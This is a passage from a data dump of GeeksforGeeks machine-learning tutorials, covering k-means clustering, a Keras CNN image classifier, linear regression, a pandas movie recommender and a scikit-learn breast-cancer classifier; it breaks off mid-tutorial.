to their nearest cluster and update the cluster\u2019s mean. We will repeat the process for a fixed number of iterations. If between two iterations no item changes classification, we stop the process as the algorithm has found the optimal solution.The below function takes as input k (the number of desired clusters), the items and the number of maximum iterations, and returns the means and the clusters. The classification of an item is stored in the array belongsTo and the number of items in a cluster is stored in clusterSizes.\u00a0Pythondef CalculateMeans(k,items,maxIterations=100000):\u00a0\u00a0\u00a0\u00a0\u00a0# Find the minima and maxima for columns\u00a0\u00a0\u00a0\u00a0cMin, cMax = FindColMinMax(items);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Initialize means at random points\u00a0\u00a0\u00a0\u00a0means = InitializeMeans(items,k,cMin,cMax);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Initialize clusters, the array to hold\u00a0\u00a0\u00a0\u00a0# the number of items in a class\u00a0\u00a0\u00a0\u00a0clusterSizes= [0 for i in range(len(means))];\u00a0\u00a0\u00a0\u00a0\u00a0# An array to hold the cluster an item is in\u00a0\u00a0\u00a0\u00a0belongsTo = [0 for i in range(len(items))];\u00a0\u00a0\u00a0\u00a0\u00a0# Calculate means\u00a0\u00a0\u00a0\u00a0for e in range(maxIterations):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# If no change of cluster occurs, halt\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0noChange = True;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(items)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0item = items[i];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Classify item into a cluster and update the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# corresponding means.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0index = Classify(means,item);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clusterSizes[index] += 1;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cSize = clusterSizes[index];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0means[index] = UpdateMean(cSize,means[index],item);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Item changed cluster\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if(index != belongsTo[i]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0noChange = False;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0belongsTo[i] = index;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Nothing changed, return\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (noChange):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break;\u00a0\u00a0\u00a0\u00a0\u00a0return means;Find ClustersFinally, we want to find the clusters, given the means. We will iterate through all the items and we will classify each item to its closest cluster.\u00a0Pythondef FindClusters(means,items):\u00a0\u00a0\u00a0\u00a0clusters = [[] for i in range(len(means))]; # Init clusters\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for item in items:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Classify item into a cluster\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0index = Classify(means,item);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Add item to cluster\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0clusters[index].append(item);\u00a0\u00a0\u00a0\u00a0\u00a0return clusters;The other popularly used similarity measures are:-1. Cosine distance: It determines the cosine of the angle between the point vectors of the two points in the n-dimensional space2. Manhattan distance: It computes the sum of the absolute differences between the coordinates of the two data points.3. Minkowski distance: It is also known as the generalized distance metric. It can be used for both ordinal and quantitative variablesYou can find the entire code on my GitHub, along with a sample data set and a plotting function. Thanks for reading.This article is contributed by Antonis Maronikolakis. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "6edb36fa18595810370e5350b97be3e8",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite: Image Classifier using CNNImage classification is a method to classify the images into their respective category classes using some methods like :\u00a0\u00a0Training a small network from scratchFine-tuning the top layers of the model using VGG16Let\u2019s discuss how to train the model from scratch and classify the data containing cars and planes.Train Data: Train data contains the 200 images of each car and plane i.e. total there are 400 images in the training dataset\u00a0Test Data: Test data contains 50 images of each car and plane i.e. total there are 100 images in the test datasetTo download the complete dataset, click here.Model Description: Before starting with the model firstly prepare the dataset and its arrangement. Look at the following image given below:\u00a0\u00a0For feeding the dataset folders they should be made and provided into this format only. So now, Let\u2019s begins with the model:\u00a0For training the model we don\u2019t need a large high-end machine and GPU\u2019s, we can work with CPU\u2019s also. Firstly, in given code include the following libraries:\u00a0Python3# Importing all necessary librariesfrom keras.preprocessing.image import ImageDataGeneratorfrom keras.models import Sequentialfrom keras.layers import Conv2D, MaxPooling2Dfrom keras.layers import Activation, Dropout, Flatten, Densefrom keras import backend as K\u00a0img_width, img_height = 224, 224Every image in the dataset is of the size 224*224.\u00a0\u00a0Python3train_data_dir = 'v_data/train'validation_data_dir = 'v_data/test'nb_train_samples =400nb_validation_samples = 100epochs = 10batch_size = 16Here, the train_data_dir is the train dataset directory. validation_data_dir is the directory for validation data. nb_train_samples is the total number of train samples. nb_validation_samples is the total number of validation samples.Checking format of Image:\u00a0\u00a0Python3if K.image_data_format() == 'channels_first':\u00a0\u00a0\u00a0\u00a0input_shape = (3, img_width, img_height)else:\u00a0\u00a0\u00a0\u00a0input_shape = (img_width, img_height, 3)This part is to check the data format i.e the RGB channel is coming first or last so, whatever it may be, the model will check first and then input shape will be fed accordingly.\u00a0Python3model = Sequential()model.add(Conv2D(32, (2, 2), input_shape=input_shape))model.add(Activation('relu'))model.add(MaxPooling2D(pool_size=(2, 2)))\u00a0model.add(Conv2D(32, (2, 2)))model.add(Activation('relu'))model.add(MaxPooling2D(pool_size=(2, 2)))\u00a0model.add(Conv2D(64, (2, 2)))model.add(Activation('relu'))model.add(MaxPooling2D(pool_size=(2, 2)))\u00a0model.add(Flatten())model.add(Dense(64))model.add(Activation('relu'))model.add(Dropout(0.5))model.add(Dense(1))model.add(Activation('sigmoid'))About the following terms used above:\u00a0Conv2D is the layer to convolve the image into multiple images\u00a0Activation is the activation function.\u00a0MaxPooling2D is used to max pool the value from the given size matrix and same is used for the next 2 layers. then, Flatten is used to flatten the dimensions of the image obtained after convolving it.\u00a0Dense is used to make this a fully connected model and is the hidden layer.\u00a0Dropout is used to avoid overfitting on the dataset.\u00a0Dense is the output layer contains only one neuron which decide to which category image belongs.Compile Function:\u00a0\u00a0Python3model.compile(loss='binary_crossentropy',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0optimizer='rmsprop',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0metrics=['accuracy'])Compile function is used here that involve the use of loss, optimizers and metrics. Here loss function used is binary_crossentropy, optimizer used is rmsprop.\u00a0Using DataGenerator:\u00a0\u00a0Python3train_datagen = ImageDataGenerator(\u00a0\u00a0\u00a0\u00a0rescale=1. / 255,\u00a0\u00a0\u00a0\u00a0shear_range=0.2,\u00a0\u00a0\u00a0\u00a0zoom_range=0.2,\u00a0\u00a0\u00a0\u00a0horizontal_flip=True)\u00a0test_datagen = ImageDataGenerator(rescale=1. / 255)\u00a0train_generator = train_datagen.flow_from_directory(\u00a0\u00a0\u00a0\u00a0train_data_dir,\u00a0\u00a0\u00a0\u00a0target_size=(img_width, img_height),\u00a0\u00a0\u00a0\u00a0batch_size=batch_size,\u00a0\u00a0\u00a0\u00a0class_mode='binary')\u00a0validation_generator = test_datagen.flow_from_directory(\u00a0\u00a0\u00a0\u00a0validation_data_dir,\u00a0\u00a0\u00a0\u00a0target_size=(img_width, img_height),\u00a0\u00a0\u00a0\u00a0batch_size=batch_size,\u00a0\u00a0\u00a0\u00a0class_mode='binary')\u00a0model.fit_generator(\u00a0\u00a0\u00a0\u00a0train_generator,\u00a0\u00a0\u00a0\u00a0steps_per_epoch=nb_train_samples // batch_size,\u00a0\u00a0\u00a0\u00a0epochs=epochs,\u00a0\u00a0\u00a0\u00a0validation_data=validation_generator,\u00a0\u00a0\u00a0\u00a0validation_steps=nb_validation_samples // batch_size)Now, the part of dataGenerator comes into the figure. In which we have used:\u00a0ImageDataGenerator that rescales the image, applies shear in some range, zooms the image and does horizontal flipping with the image. This ImageDataGenerator includes all possible orientation of the image.\u00a0train_datagen.flow_from_directory is the function that is used to prepare data from the train_dataset directory Target_size specifies the target size of the image.\u00a0test_datagen.flow_from_directory is used to prepare test data for the model and all is similar as above.\u00a0fit_generator is used to fit the data into the model made above, other factors used are steps_per_epochs tells us about the number of times the model will execute for the training data.\u00a0epochs tells us the number of times model will be trained in forward and backward pass.\u00a0validation_data is used to feed the validation/test data into the model.\u00a0validation_steps denotes the number of validation/test samples.Python3model.save_weights('model_saved.h5')At last, we can also save the model.\u00a0\u00a0Model Output:\u00a0\u00a0Loading and PredictionLoad Model with \u201cload_model\u201dConvert Images to Numpy Arrays for passing into ML ModelPrint the predicted output from the model.Python3from keras.models import load_modelfrom keras.preprocessing.image import load_imgfrom keras.preprocessing.image import img_to_arrayfrom keras.applications.vgg16 import preprocess_inputfrom keras.applications.vgg16 import decode_predictionsfrom keras.applications.vgg16 import VGG16import numpy as np\u00a0from keras.models import load_model\u00a0model = load_model('saved_model.h5')\u00a0image = load_img('v_data/test/planes/5.jpg', target_size=(227, 227))img = np.array(image)img = img / 255.0img = img.reshape(1,227,227,3)label = model.predict_classes(img)print(\"Predicted Class (0 - Cars , 1- Planes): \", label[0][0])Output :Predicted Class (0 \u2013 Cars , 1- Planes): 1My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d5919b84d85448a3bc0842ea30bf9386",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Create a Linear Regression Model in Python using a randomly created data set.Linear Regression ModelLinear regression geeks for geeksGenerating the Training Set# python library to generate random numbersfrom random import randint\u00a0\u00a0# the limit within which random numbers are generatedTRAIN_SET_LIMIT = 1000\u00a0\u00a0# to create exactly 100 data itemsTRAIN_SET_COUNT = 100\u00a0\u00a0# list that contains input and corresponding outputTRAIN_INPUT = list()TRAIN_OUTPUT = list()\u00a0\u00a0# loop to create 100 data\u00a0 items with three columns eachfor i in range(TRAIN_SET_COUNT):\u00a0\u00a0\u00a0\u00a0a = randint(0, TRAIN_SET_LIMIT)\u00a0\u00a0\u00a0\u00a0b = randint(0, TRAIN_SET_LIMIT)\u00a0\u00a0\u00a0\u00a0c = randint(0, TRAIN_SET_LIMIT)\u00a0\u00a0# creating the output for each data item\u00a0\u00a0\u00a0\u00a0op = a + (2 * b) + (3 * c)\u00a0\u00a0\u00a0\u00a0TRAIN_INPUT.append([a, b, c])\u00a0\u00a0# adding each output to output list\u00a0\u00a0\u00a0\u00a0TRAIN_OUTPUT.append(op)Machine Learning Model \u2013 Linear RegressionThe Model can be created in two steps:-1. Training the model with Training Data2. Testing the model with Test DataTraining the ModelThe data that was created using the above code is used to train the model# Sk-Learn contains the linear regression modelfrom sklearn.linear_model import LinearRegression\u00a0\u00a0# Initialize the linear regression modelpredictor = LinearRegression(n_jobs =-1)\u00a0\u00a0# Fill the Model with the Datapredictor.fit(X = TRAIN_INPUT, y = TRAIN_OUTPUT)Testing the DataThe testing is done Manually. Testing can be done using some random data and testing if the model gives the correct result for the input data.# Random Test dataX_TEST = [[ 10, 20, 30 ]]\u00a0\u00a0# Predict the result of X_TEST which holds testing dataoutcome = predictor.predict(X = X_TEST)\u00a0\u00a0# Predict the coefficientscoefficients = predictor.coef_\u00a0\u00a0# Print the result obtained for the test dataprint('Outcome : {}\\nCoefficients : {}'.format(outcome, coefficients))The Outcome of the above provided test-data should be, 10 + 20*2 + 30*3 = 140.Output\r\nOutcome : [ 140.]\r\nCoefficients : [ 1. 2. 3.]\r\nMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8e2503e843d4813e36437fdf3c1f8368",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Recommender System is a system that seeks to predict or filter preferences according to the user\u2019s choices. Recommender systems are utilized in a variety of areas including movies, music, news, books, research articles, search queries, social tags, and products in general.\u00a0Recommender systems produce a list of recommendations in any of the two ways \u2013\u00a0\u00a0Collaborative filtering: Collaborative filtering approaches build a model from the user\u2019s past behavior (i.e. items purchased or searched by the user) as well as similar decisions made by other users. This model is then used to predict items (or ratings for items) that users may have an interest in.Content-based filtering: Content-based filtering approaches uses a series of discrete characteristics of an item in order to recommend additional items with similar properties. Content-based filtering methods are totally based on a description of the item and a profile of the user\u2019s preferences. It recommends items based on the user\u2019s past preferences.Let\u2019s develop a basic recommendation system using Python and Pandas.\u00a0Let\u2019s focus on providing a basic recommendation system by suggesting items that are most similar to a particular item, in this case, movies. It just tells what movies/items are most similar to the user\u2019s movie choice.To download the files, click on the links \u2013 .tsv file, Movie_Id_Titles.csv.Import dataset with delimiter \u201c\\t\u201d as the file is a tsv file (tab-separated file).\u00a0\u00a0Python3# import pandas libraryimport pandas as pd\u00a0# Get the datacolumn_names = ['user_id', 'item_id', 'rating', 'timestamp']\u00a0path = 'https://media.geeksforgeeks.org/wp-content/uploads/file.tsv'\u00a0df = pd.read_csv(path, sep='\\t', names=column_names)\u00a0# Check the head of the datadf.head()\u00a0\u00a0Python3# Check out all the movies and their respective IDsmovie_titles = pd.read_csv('https://media.geeksforgeeks.org/wp-content/uploads/Movie_Id_Titles.csv')movie_titles.head()\u00a0\u00a0\u00a0Python3data = pd.merge(df, movie_titles, on='item_id')data.head()\u00a0\u00a0Python3# Calculate mean rating of all moviesdata.groupby('title')['rating'].mean().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# Calculate count rating of all moviesdata.groupby('title')['rating'].count().sort_values(ascending=False).head()\u00a0\u00a0\u00a0Python3# creating dataframe with 'rating' count valuesratings = pd.DataFrame(data.groupby('title')['rating'].mean())\u00a0ratings['num of ratings'] = pd.DataFrame(data.groupby('title')['rating'].count())\u00a0ratings.head()\u00a0\u00a0\u00a0Visualization imports:\u00a0\u00a0Python3import matplotlib.pyplot as pltimport seaborn as sns\u00a0sns.set_style('white')%matplotlib inline\u00a0\u00a0Python3# plot graph of 'num of ratings column'plt.figure(figsize =(10, 4))\u00a0ratings['num of ratings'].hist(bins = 70)\u00a0\u00a0Python3# plot graph of 'ratings' columnplt.figure(figsize =(10, 4))\u00a0ratings['rating'].hist(bins = 70)\u00a0\u00a0Python3# Sorting values according to# the 'num of rating column'moviemat = data.pivot_table(index ='user_id',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0columns ='title', values ='rating')\u00a0moviemat.head()\u00a0ratings.sort_values('num of ratings', ascending = False).head(10)\u00a0\u00a0\u00a0Python3# analysing correlation with similar moviesstarwars_user_ratings = moviemat['Star Wars (1977)']liarliar_user_ratings = moviemat['Liar Liar (1997)']\u00a0starwars_user_ratings.head()\u00a0\u00a0Python3# analysing correlation with similar moviessimilar_to_starwars = moviemat.corrwith(starwars_user_ratings)similar_to_liarliar = moviemat.corrwith(liarliar_user_ratings)\u00a0corr_starwars = pd.DataFrame(similar_to_starwars, columns =['Correlation'])corr_starwars.dropna(inplace = True)\u00a0corr_starwars.head()\u00a0\u00a0\u00a0\u00a0Python3# Similar movies like starwarscorr_starwars.sort_values('Correlation', ascending = False).head(10)corr_starwars = corr_starwars.join(ratings['num of ratings'])\u00a0corr_starwars.head()\u00a0corr_starwars[corr_starwars['num of ratings']>100].sort_values('Correlation', ascending = False).head()Python3# Similar movies as of liarliarcorr_liarliar = pd.DataFrame(similar_to_liarliar, columns =['Correlation'])corr_liarliar.dropna(inplace = True)\u00a0corr_liarliar = corr_liarliar.join(ratings['num of ratings'])corr_liarliar[corr_liarliar['num of ratings']>100].sort_values('Correlation', ascending = False).head()My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "266e118079d6b653936b8106fd8006ba",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Boston Housing Data: This dataset was taken from the StatLib library and is maintained by Carnegie Mellon University. This dataset concerns the housing prices in the housing city of Boston. The dataset provided has 506 instances with 13 features.The Description of the dataset is taken from\u00a0\u00a0Let\u2019s make the Linear Regression Model, predicting housing pricesInputting Libraries and dataset.\u00a0\u00a0Python3# Importing Librariesimport numpy as npimport pandas as pdimport matplotlib.pyplot as plt\u00a0\u00a0# Importing Datafrom sklearn.datasets import load_bostonboston = load_boston()The shape of input Boston data and getting feature_names\u00a0\u00a0Python3boston.data.shapePython3boston.feature_names\u00a0Converting data from nd-array to data frame and adding feature names to the data\u00a0\u00a0Python3data = pd.DataFrame(boston.data)data.columns = boston.feature_names\u00a0data.head(10)\u00a0\u00a0Adding \u2018Price\u2019 column to the dataset\u00a0\u00a0Python3# Adding 'Price' (target) column to the databoston.target.shapePython3data['Price'] = boston.targetdata.head()\u00a0Description of Boston dataset\u00a0\u00a0Python3data.describe()\u00a0\u00a0Info of Boston Dataset\u00a0\u00a0Python3data.info()\u00a0\u00a0Getting input and output data and further splitting data to training and testing dataset.\u00a0\u00a0Python3# Input Datax = boston.data\u00a0\u00a0# Output Datay = boston.target\u00a0\u00a0\u00a0\u00a0# splitting data to training and testing dataset.\u00a0#from sklearn.cross_validation import train_test_split#the submodule cross_validation is renamed and reprecated to model_selectionfrom sklearn.model_selection import train_test_split\u00a0xtrain, xtest, ytrain, ytest = train_test_split(x, y, test_size =0.2,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_state = 0)\u00a0\u00a0print(\"xtrain shape : \", xtrain.shape)print(\"xtest shape\u00a0 : \", xtest.shape)print(\"ytrain shape : \", ytrain.shape)print(\"ytest shape\u00a0 : \", ytest.shape)\u00a0\u00a0Applying Linear Regression Model to the dataset and predicting the prices.\u00a0\u00a0Python3# Fitting Multi Linear regression model to training modelfrom sklearn.linear_model import LinearRegressionregressor = LinearRegression()regressor.fit(xtrain, ytrain)\u00a0\u00a0# predicting the test set resultsy_pred = regressor.predict(xtest)Plotting Scatter graph to show the prediction results \u2013 \u2018ytrue\u2019 value vs \u2018y_pred\u2019 value\u00a0\u00a0Python3# Plotting Scatter graph to show the prediction# results - 'ytrue' value vs 'y_pred' valueplt.scatter(ytest, y_pred, c = 'green')plt.xlabel(\"Price: in $1000's\")plt.ylabel(\"Predicted value\")plt.title(\"True value vs predicted value : Linear Regression\")plt.show()Results of Linear Regression i.e. Mean Squared Error.\u00a0\u00a0Python3# Results of Linear Regression.from sklearn.metrics import mean_squared_errormse = mean_squared_error(ytest, y_pred)print(\"Mean Square Error : \", mse)As per the result, our model is only 66.55% accurate. So, the prepared model is not very good for predicting housing prices. One can improve the prediction results using many other possible machine learning algorithms and techniques.\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ea5697f266e9d5bd45d7e321e85ef641",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Machine Learning is a sub-field of Artificial Intelligence that gives systems the ability to learn themselves without being explicitly programmed to do so. Machine Learning can be used in solving many real world problems.\u00a0Let\u2019s classify cancer cells based on their features, and identifying them if they are \u2018malignant\u2019 or \u2018benign\u2019. We will be using scikit-learn for a machine learning problem. Scikit-learn is an open-source machine learning, data mining and data analysis library for Python programming language.The dataset:\u00a0Scikit-learn comes with a few small standard datasets that do not require downloading any file from any external website. The dataset that we will be using for our machine learning problem is the Breast cancer wisconsin (diagnostic) dataset. The dataset includes several data about the breast cancer tumors along with the classifications labels, viz., malignant or benign. It can be loaded using the following function:\u00a0\u00a0load_breast_cancer([return_X_y])The data set has 569 instances or data of 569 tumors and includes data on 30 attributes or features like the radius, texture, perimeter, area, etc. of a tumor. We will be using these features to train our model.Installing the necessary modules:\u00a0For this machine learning project, we will be needing the \u2018Scikit-learn\u2019 Python module. If you don\u2019t have it installed on your machine, download and install it by running the following command in the command prompt:\u00a0\u00a0pip install scikit-learnNote: You can use any IDE for this project, by it is highly recommended Jupyter notebook for the project. This is because, since Python is an interpreted language, so, one can take its full advantage by running a few lines of code and see and understand what\u2019s happening, step by step, instead of writing the whole script and once and then running it.\u00a0Install it by running the following command in the command prompt:\u00a0\u00a0pip install jupyter\u00a0Step by step implementation of classification using Scikit-learn:Step #1: Importing the necessary module and dataset.We will be needing the \u2018Scikit-learn\u2019 module and the Breast cancer wisconsin (diagnostic) dataset.\u00a0\u00a0Python3# importing the Python moduleimport sklearn\u00a0# importing the datasetfrom sklearn.datasets import load_breast_cancer\u00a0\u00a0Step #2: Loading the dataset to a variable.\u00a0\u00a0Python3# loading the datasetdata = load_breast_cancer()The important attributes that we must consider from that dataset are \u2018target-names'(the meaning of the labels), \u2018target'(the classification labels), \u2018feature_names'(the meaning of the features) and \u2018data'(the data to learn).Step #3: Organizing the data and looking at it.\u00a0To get a better understanding of what the dataset contains and how we can use the data to train our model, let us first organize the data and then see what it contains by using the print() function.\u00a0\u00a0Python3# Organize our datalabel_names = data['target_names']labels = data['target']feature_names = data['feature_names']features = data['data']Then, using the print() function, let us examine the data.\u00a0\u00a0Python3# looking at the dataprint(label_names)Output:\u00a0\u00a0['malignant' 'benign']So, we see that each dataset of a tumor is labelled as either \u2018malignant\u2019 or \u2018benign\u2019.\u00a0\u00a0Python3print(labels)Output:\u00a0\u00a0[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n 1 0 0 0 0 0 0 0 0 1 0 1 1 1 1 1 0 0 1 0 0 1 1 1 1 0 1 0 0 1 1 1 1 0 1 0 0\n 1 0 1 0 0 1 1 1 0 0 1 0 0 0 1 1 1 0 1 1 0 0 1 1 1 0 0 1 1 1 1 0 1 1 0 1 1\n 1 1 1 1 1 1 0 0 0 1 0 0 1 1 1 0 0 1 0 1 0 0 1 0 0 1 1 0 1 1 0 1 1 1 1 0 1\n 1 1 1 1 1 1 1 1 0 1 1 1 1 0 0 1 0 1 1 0 0 1 1 0 0 1 1 1 1 0 1 1 0 0 0 1 0\n 1 0 1 1 1 0 1 1 0 0 1 0 0 0 0 1 0 0 0 1 0 1 0 1 1 0 1 0 0 0 0 1 1 0 0 1 1\n 1 0 1 1 1 1 1 0 0 1 1 0 1 1 0 0 1 0 1 1 1 1 0 1 1 1 1 1 0 1 0 0 0 0 0 0 0\n 0 0 0 0 0 0 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 0 1 0 0 1 1 1 1 1 1 1 1 1 1 1 1\n 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 0 1 0 1 1 1 1 0 0 0 1 1\n 1 1 0 1 0 1 0 1 1 1 0 1 1 1 1 1 1 1 0 0 0 1 1 1 1 1 1 1 1 1 1 1 0 0 1 0 0\n 0 1 0 0 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 0 1 1 0 0 1 1 1 1 1 1 0 1 1 1 1 1 1\n 1 0 1 1 1 1 1 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 0 1 0 0 1 0 1 1 1 1 1 0 1 1\n 0 1 0 1 1 0 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1 1 0 1\n 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 0 0 1 0 1 0 1 1 1 1 1 0 1 1 0 1 0 1 0 0\n 1 1 1 0 1 1 1 1 1 1 1 1 1 1 1 0 1 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n 1 1 1 1 1 1 1 0 0 0 0 0 0 1]From here, we see that each label is linked to binary values of 0 and 1, where 0 represents malignant tumors and 1 represents benign tumors.\u00a0\u00a0Python3print(feature_names)Output:\u00a0\u00a0['mean radius' 'mean texture' 'mean perimeter' 'mean area'\n 'mean smoothness' 'mean compactness' 'mean concavity'\n 'mean concave points' 'mean symmetry' 'mean fractal dimension'\n 'radius error' 'texture error' 'perimeter error' 'area error'\n 'smoothness error' 'compactness error' 'concavity error'\n 'concave points error' 'symmetry error' 'fractal dimension error'\n 'worst radius' 'worst texture' 'worst perimeter' 'worst area'\n 'worst smoothness' 'worst compactness' 'worst concavity'\n 'worst concave points' 'worst symmetry' 'worst fractal dimension']Here, we see all the 30 features or attributes that each dataset of the tumor has. We will be using the numerical values of these features in training our model and make the correct prediction, whether or not a tumor is malignant or benign, based on these features.\u00a0\u00a0Python3print(features)Output:\u00a0\u00a0[[1.799e+01 1.038e+01 1.228e+02 ... 2.654e-01 4.601e-01 1.189e-01]\n [2.057e+01 1.777e+01 1.329e+02 ... 1.860e-01 2.750e-01 8.902e-02]\n [1.969e+01 2.125e+01 1.300e+02 ... 2.430e-01 3.613e-01 8.758e-02]\n ...\n [1.660e+01 2.808e+01 1.083e+02 ... 1.418e-01 2.218e-01 7.820e-02]\n [2.060e+01 2.933e+01 1.401e+02 ... 2.650e-01 4.087e-01 1.240e-01]\n [7.760e+00 2.454e+01 4.792e+01 ... 0.000e+00 2.871e-01 7.039e-02]]This is a huge dataset containing the numerical values of the 30 attributes of all the 569 instances of tumor data.So, from the above data, we can conclude that the first instance of tumor is malignant and it has a mean radius of value 1.79900000e+01.\u00a0\u00a0\u00a0Step #4: Organizing the data into Sets.For testing the accuracy of our classifier, we must test the model on unseen data. So, before building the model, we will split our data into two sets, viz., training set and test set. We will be using the training set to train and evaluate the model and then use the trained model to make predictions on the unseen test set.\u00a0The sklearn module has a built-in function called the train_test_split(), which automatically divides the data into these sets. We will be using this function two split the data.\u00a0\u00a0Python3# importing the functionfrom sklearn.model_selection import train_test_split\u00a0# splitting the datatrain, test, train_labels, test_labels = train_test_split(features, labels,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0test_size = 0.33, random_state = 42)The train_test_split() function randomly splits the data using the parameter test_size. What we have done here is that we have split 33% of the original data into test data (test). The remaining data (train) is the training data. Also, we have respective labels for both the train variables and test variables, i.e. train_labels and test_labels.To learn more about how to use the train_test_split() function, you can refer to the official documentation.\u00a0\u00a0\u00a0Step #5: Building the Model.There are many machine learning models to choose from. All of them have their own advantages and disadvantages. For this model, we will be using the Naive Bayes algorithm that usually performs well in binary classification tasks. Firstly, import the GaussianNB module and initialize it using the GaussianNB() function. Then train the model by fitting it to the data in the dataset using the fit() method.\u00a0Python3# importing the module of the machine learning modelfrom 